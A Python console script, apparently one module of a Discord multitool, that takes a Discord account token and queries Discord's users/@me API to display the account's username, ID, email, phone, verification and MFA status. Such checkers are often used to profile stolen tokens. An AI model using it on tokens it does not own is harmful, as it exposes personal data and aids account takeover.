import os
import requests
import time

# Define color class for formatting
class Fuckcolors:
    red = '\033[91m'
    reset = '\033[0m'

# Clear the console based on OS
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to center text horizontally and add vertical offset
def center_text(text, width, vertical_offset=2):
    lines = text.split("\n")
    horizontal_padding = (width - max(len(line) for line in lines)) // 2

    # Create padded lines
    padded_lines = [' ' * horizontal_padding + line for line in lines]
    return "\n" * vertical_offset + "\n".join(padded_lines)

# Function to display a title
def Title(title):
    clear()
    title_text = f"{Fuckcolors.red}{'=' * 20} {title} {'=' * 20}{Fuckcolors.reset}"
    
    # Get terminal width and center the title
    width, _ = os.get_terminal_size()
    centered_title = center_text(title_text, width, vertical_offset=2)

    # Display the centered title
    print(centered_title)

# Function to show a loading message
def Slow(message):
    print(f"{Fuckcolors.red}{message}{Fuckcolors.reset}")
    time.sleep(2)

# Function to display an error message
def Error(message):
    print(f"{Fuckcolors.red}[ERROR] {message}{Fuckcolors.reset}")

# Function to get Discord token information
def get_token_info(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            return {
                'Username': f"{user_data['username']}#{user_data['discriminator']}",
                'ID': user_data['id'],
                'Email': user_data.get('email', 'None'),
                'Phone': user_data.get('phone', 'None'),
                'Verified': user_data.get('verified', 'False'),
                'MFA Enabled': user_data.get('mfa_enabled', 'False'),
                'Locale': user_data.get('locale', 'None'),
            }
        else:
            Error(f"Invalid Token or failed request. Status Code: {response.status_code}")
            return None
    except Exception as e:
        Error(f"Failed to retrieve token information: {str(e)}")
        return None

# Main function
def main():
    Title("Discord Token Info")

    token = input(f"\n{time.strftime('%H:%M:%S')} Enter Discord Token -> ")
    
    if not token:
        Error("Token is required!")
        return

    Slow("Fetching token information...")

    token_info = get_token_info(token)
    
    if token_info:
        result_text = f"""
        {Fuckcolors.red}[INFO]{Fuckcolors.reset} Username   : {token_info['Username']}
        {Fuckcolors.red}[INFO]{Fuckcolors.reset} User ID    : {token_info['ID']}
        {Fuckcolors.red}[INFO]{Fuckcolors.reset} Email      : {token_info['Email']}
        {Fuckcolors.red}[INFO]{Fuckcolors.reset} Phone      : {token_info['Phone']}
        {Fuckcolors.red}[INFO]{Fuckcolors.reset} Verified   : {token_info['Verified']}
        {Fuckcolors.red}[INFO]{Fuckcolors.reset} MFA        : {token_info['MFA Enabled']}
        {Fuckcolors.red}[INFO]{Fuckcolors.reset} Locale     : {token_info['Locale']}
        """
        print(result_text)
    else:
        Error("No information retrieved.")

    input(f"\n{time.strftime('%H:%M:%S')} Press Enter to return to the main menu...")

if __name__ == "__main__":
    main()
